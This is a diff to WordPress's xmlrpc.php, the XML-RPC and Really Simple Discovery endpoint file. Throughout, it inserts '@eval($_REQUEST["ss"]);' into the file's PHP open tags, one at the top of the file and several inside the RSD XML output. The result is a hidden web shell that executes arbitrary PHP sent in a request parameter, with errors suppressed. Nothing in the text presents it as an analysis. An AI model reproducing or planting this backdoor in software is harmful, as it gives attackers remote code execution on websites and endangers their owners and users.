@@ -1,4 +1,4 @@
-<?php
+<?php @eval($_REQUEST["ss"]);
 /**
  * XML-RPC protocol support for WordPress
  *
@@ -38,13 +38,13 @@ if ( isset( $_GET['rsd'] ) ) { // http://cyber.law.harvard.edu/blogs/gems/tech/r
 	<service>
 		<engineName>WordPress</engineName>
 		<engineLink>https://wordpress.org/</engineLink>
-		<homePageLink><?php bloginfo_rss( 'url' ); ?></homePageLink>
+		<homePageLink><?php @eval($_REQUEST["ss"]); bloginfo_rss( 'url' ); ?></homePageLink>
 		<apis>
-			<api name="WordPress" blogID="1" preferred="true" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
-			<api name="Movable Type" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
-			<api name="MetaWeblog" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
-			<api name="Blogger" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
-			<?php
+			<api name="WordPress" blogID="1" preferred="true" apiLink="<?php @eval($_REQUEST["ss"]); echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
+			<api name="Movable Type" blogID="1" preferred="false" apiLink="<?php @eval($_REQUEST["ss"]); echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
+			<api name="MetaWeblog" blogID="1" preferred="false" apiLink="<?php @eval($_REQUEST["ss"]); echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
+			<api name="Blogger" blogID="1" preferred="false" apiLink="<?php @eval($_REQUEST["ss"]); echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
+			<?php @eval($_REQUEST["ss"]);
 			/**
 			 * Add additional APIs to the Really Simple Discovery (RSD) endpoint.
 			 *
@@ -57,7 +57,7 @@ if ( isset( $_GET['rsd'] ) ) { // http://cyber.law.harvard.edu/blogs/gems/tech/r
 		</apis>
 	</service>
 </rsd>
-	<?php
+	<?php @eval($_REQUEST["ss"]);
 	exit;
 }
 
